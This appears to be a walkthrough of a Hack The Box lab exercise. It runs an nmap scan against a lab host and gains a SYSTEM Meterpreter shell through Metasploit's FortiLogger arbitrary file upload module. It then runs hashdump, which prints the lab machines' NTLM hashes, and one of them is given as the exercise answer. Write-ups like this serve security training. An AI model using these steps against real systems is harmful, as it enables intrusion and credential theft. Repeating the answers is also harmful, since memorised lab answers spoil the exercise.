# Meterpreter

### Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sV -sC 10.129.203.65
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 04:15 EST
Nmap scan report for 10.129.203.65 (10.129.203.65)
Host is up (0.27s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-02-18T09:16:08+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-51BJ97BCIPV
|   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
|   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
|   DNS_Domain_Name: WIN-51BJ97BCIPV
|   DNS_Computer_Name: WIN-51BJ97BCIPV
|   Product_Version: 10.0.17763
|_  System_Time: 2024-02-18T09:16:00+00:00
| ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
| Not valid before: 2024-02-17T08:56:13
|_Not valid after:  2024-08-18T08:56:13
5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: FortiLogger | Log and Report System
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-18T09:15:59
|_  start_date: N/A
```

lets check the http for vuln

```bash
#it use fortilogger version 3.1.7
msfconsole
use exploit/windows/http/fortilogger_arbitrary_fileupload
use 0
set rhost
set lhost
set lport
run
getuid
Server username: NT AUTHORITY\SYSTEM
```

### Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

```bash
hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
```

cf3a5525ee9414229e66279623ed5c58
